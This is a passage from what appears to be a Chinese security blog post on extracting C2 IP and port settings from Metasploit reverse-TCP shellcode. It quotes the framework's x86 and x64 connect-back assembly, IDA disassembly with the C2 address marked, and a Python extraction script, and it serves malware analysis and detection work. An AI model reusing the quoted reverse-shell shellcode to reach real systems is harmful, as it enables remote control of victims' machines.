&quot;connect&quot; )</span><br><span class="line">  call ebp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line"></span><br><span class="line">  test eax,eax           ; non-zero means a failure</span><br><span class="line">  jz short connected</span><br><span class="line"></span><br><span class="line">handle_failure:</span><br><span class="line">  dec dword [esi+8]</span><br><span class="line">  jnz short try_connect</span><br><span class="line"></span><br><span class="line">failure:</span><br><span class="line">  push 0x56A2B5F0        ; hardcoded to exitprocess for size</span><br><span class="line">  call ebp</span><br><span class="line"></span><br><span class="line">connected:</span><br></pre></td></tr></table></figure>
<p>可以看到这个文件执行的主要操作就是加载ws2_32.dll这个库，ws2_32.dll中提供了socket连接相关的功能。</p>
<p>其中可以看到在set_address一节中有如下两条汇编指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x0100007F        ; host 127.0.0.1</span><br><span class="line">push 0x5C110002        ; family AF_INET and port 4444</span><br></pre></td></tr></table></figure>
<p>这两条指令代表了将要连接的ip和port入栈，据此，如果攻击者没有魔改过Metasploit，我们只需根据其前后的特征码去匹配，将中间的这两条汇编指令提取出来即可。我们可以用Metasploit生成一段纯shellcode，然后将其载入ida中观察，可以发现IP和端口的信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seg000:00000095 sub_95          proc near</span><br><span class="line">seg000:00000095</span><br><span class="line">seg000:00000095 var_22C         &#x3D; dword ptr -22Ch</span><br><span class="line">seg000:00000095</span><br><span class="line">seg000:00000095                 pop     ebp</span><br><span class="line">seg000:00000096                 push    3233h</span><br><span class="line">seg000:0000009B                 push    5F327377h</span><br><span class="line">seg000:000000A0                 push    esp</span><br><span class="line">seg000:000000A1                 push    726774Ch</span><br><span class="line">seg000:000000A6                 mov     eax, ebp</span><br><span class="line">seg000:000000A8                 call    eax</span><br><span class="line">seg000:000000AA                 mov     eax, 190h</span><br><span class="line">seg000:000000AF                 sub     esp, eax</span><br><span class="line">seg000:000000B1                 push    esp</span><br><span class="line">seg000:000000B2                 push    eax</span><br><span class="line">seg000:000000B3                 push    6B8029h</span><br><span class="line">seg000:000000B8                 call    ebp</span><br><span class="line">seg000:000000BA                 push    0Ah</span><br><span class="line">seg000:000000BC</span><br><span class="line">seg000:000000BC loc_BC:                                 ; CODE XREF: sub_95+B1↓j</span><br><span class="line">seg000:000000BC                 push    100007Fh				# C2地址</span><br><span class="line">seg000:000000C1                 push    5C110002h				# 端口</span><br><span class="line">seg000:000000C6                 mov     esi, esp</span><br><span class="line">seg000:000000C8                 push    eax</span><br><span class="line">seg000:000000C9                 push    eax</span><br><span class="line">seg000:000000CA                 push    eax</span><br><span class="line">seg000:000000CB                 push    eax</span><br><span class="line">seg000:000000CC                 inc     eax</span><br><span class="line">seg000:000000CD                 push    eax</span><br><span class="line">seg000:000000CE                 inc     eax</span><br><span class="line">seg000:000000CF                 push    eax</span><br><span class="line">seg000:000000D0                 push    0E0DF0FEAh</span><br><span class="line">seg000:000000D5                 call    ebp</span><br><span class="line">seg000:000000D7                 xchg    eax, edi</span><br></pre></td></tr></table></figure>
<p>得到C2地址：7F 00 00 01 = 127.0.0.1</p>
<p>得到端口：02 00 <strong>11 5C</strong> = 4444</p>
<p>提取脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_config_32</span>(<span class="params">data</span>):</span></span><br><span class="line">    data = <span class="built_in">list</span>(<span class="built_in">sorted</span>(data.items()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="comment"># push xxx</span></span><br><span class="line">        <span class="keyword">if</span> data[i][<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;push&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(data[i][<span class="number">1</span>][<span class="number">1</span>]) &gt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> data[i+<span class="number">1</span>][<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;push&#x27;</span> <span class="keyword">and</span> data[i+<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>][-<span class="number">4</span>:] == <span class="string">&#x27;0002&#x27;</span>:</span><br><span class="line">                ip = (<span class="number">8</span> - <span class="built_in">len</span>(data[i][<span class="number">1</span>][<span class="number">1</span>][<span class="number">2</span>:])) * <span class="string">&#x27;0&#x27;</span> + data[i][<span class="number">1</span>][<span class="number">1</span>][<span class="number">2</span>:]  <span class="comment"># 补齐ip地址为8个16进制数</span></span><br><span class="line">                ip_4 = <span class="built_in">int</span>(ip[<span class="number">0</span>:<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">                ip_3 = <span class="built_in">int</span>(ip[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">                ip_2 = <span class="built_in">int</span>(ip[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line">                ip_1 = <span class="built_in">int</span>(ip[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">                echo(<span class="string">&#x27;ip地址：&#x27;</span> + <span class="built_in">str</span>(ip_1) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(ip_2) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(ip_3) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(ip_4))</span><br><span class="line">                port = data[i+<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>][<span class="number">4</span>:<span class="number">6</span>] + data[i+<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>][<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">                echo(<span class="string">&#x27;端口：&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(port, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>
<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>对于x64架构的C2配置提取，也采取同样思路，其中连接建立过程的汇编代码见：<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span><br><span class="line">; Compatible: Windows 7, 2003</span><br><span class="line">; Architecture: x64</span><br><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">; Input: RBP must be the address of &#39;api_call&#39;.</span><br><span class="line">; Output: RDI will be the socket for the connection to the server</span><br><span class="line">; Clobbers: RAX, RCX, RDX, RDI, R8, R9, R10, R12, R13, R14, R15</span><br><span class="line"></span><br><span class="line">reverse_tcp:</span><br><span class="line">  ; setup the structures we need on the stack...</span><br><span class="line">  mov r14, &#39;ws2_32&#39;</span><br><span class="line">  push r14               ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.</span><br><span class="line">  mov r14, rsp           ; save pointer to the &quot;ws2_32&quot; string for LoadLibraryA call.</span><br><span class="line">  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)</span><br><span class="line">  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.</span><br><span class="line">  mov r12, 0x0100007F5C110002        </span><br><span class="line">  push r12               ; host 127.0.0.1, family AF_INET and port 4444</span><br><span class="line">  mov r12, rsp           ; save pointer to sockaddr struct for connect call</span><br><span class="line">  ; perform the call to LoadLibraryA...</span><br><span class="line">  mov rcx, r14           ; set the param for the library to load</span><br><span class="line">  mov r10d, 0x0726774C   ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call rbp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  ; perform the call to WSAStartup...</span><br><span class="line">  mov rdx, r13           ; second param is a pointer to this stuct</span><br><span class="line">  push 0x0101            ;</span><br><span class="line">  pop rcx                ; set the param for the version requested</span><br><span class="line">  mov r10d, 0x006B8029   ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call rbp               ; WSAStartup( 0x0101, &amp;WSAData );</span><br><span class="line">  ; perform the call to WSASocketA...</span><br><span class="line">  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.</span><br><span class="line">  push rax               ; push null for reserved parameter</span><br><span class="line">  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  xor r8, r8             ; we do not specify a protocol</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rdx, rax           ; push SOCK_STREAM</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rcx, rax           ; push AF_INET</span><br><span class="line">  mov r10d, 0xE0DF0FEA   ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  mov rdi, rax           ; save the socket for later</span><br><span class="line">  ; perform the call to connect...</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  pop r8                 ; pop off the third param</span><br><span class="line">  mov rdx, r12           ; set second param to pointer to sockaddr struct</span><br><span class="line">  mov rcx, rdi           ; the socket</span><br><span class="line">  mov r10d, 0x6174A599   ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call rbp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line">  ; restore RSP so we dont have any alignment issues with the next block...</span><br><span class="line">  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocations</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov r12, 0x0100007F5C110002        </span><br><span class="line">push r12               ; host 127.0.0.1, family AF_INET and port 4444</span><br></pre></td></tr></table></figure>
<p>IP信息和端口信息会被存入r12寄存器</p>
<p>提取思路同32位</p>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://docs.metasploit.com/">Metasploit Documentation </a></p>
<p><a target="_blank" rel="noopener" href="https://www.unicorn-engine.org/">Unicorn</a></p>
<p><a target="_blank" rel="noopener" href="https://linasm.sourceforge.net/docs/instructions/fpu.php">Floating-Point Unit (FPU) instructions set</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/238645">SMC自解码总结</a></p>
<p><a target="_blank" rel="noopener" href="https://wonderkun.cc/2021/04/25/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-metasploit%E7%9A%84shellcode%E5%88%86%E6%9E%90(%E4%B8%89">杀软的无奈-metasploit的shellcode loader分析(三)</a>)</p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-256000-1.htm">如何编写shellcode获取EIP</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PM9tw1hXNEMqQq9vrK45kw">DataCon2023软件安全赛道，冠军战队WP分享</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/24/MSF-C2/">http://example.com/2024/01/24/MSF-C2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Alex's blog~</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/reverse/">reverse</a><a class="post-meta__tags" href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2024/03/25/texsaw2024/"><i class="fa fa-chevron-left">  </i><span>TexSAW2024 write up by 马嘉祺.</span></a></div><div class="next-post pull-right"><a href="/2023/09/16/LJB-2023/"><span>陇剑杯被薄纱之旅</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2025 By Alex</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>